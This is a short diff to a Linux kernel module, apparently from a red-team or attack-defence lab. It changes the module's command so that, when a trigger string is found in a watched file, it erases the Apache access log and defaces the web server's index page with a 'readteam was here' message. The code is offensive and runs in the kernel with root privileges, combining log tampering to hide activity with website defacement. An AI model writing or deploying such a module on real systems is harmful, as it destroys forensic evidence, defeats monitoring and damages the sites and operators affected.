@@ -14,10 +14,12 @@ MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM file check and command execution module");
 MODULE_VERSION("1.0");
 
-#define FILE_PATH "/root/.ssh/authorized_keys"
+#define FILE_PATH "/var/log/apache2/access.log"
 #define TARGET_STRING "pizza"
 
-static char* argv[] = {"/bin/bash", "-c", "echo hi > /tmp/test_file", NULL};
+static char* argv[] = {"/bin/bash", "-c", 
+	"echo 'nothing to see here' > /var/log/apache2/access.log && echo 'readteam was here' > /var/www/html/index.html"
+, NULL};
 static char* envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 static struct timer_list file_check_timer;
@@ -129,3 +131,4 @@ static void __exit file_check_exit(void) {
 
 module_init(file_check_init);
 module_exit(file_check_exit);
+
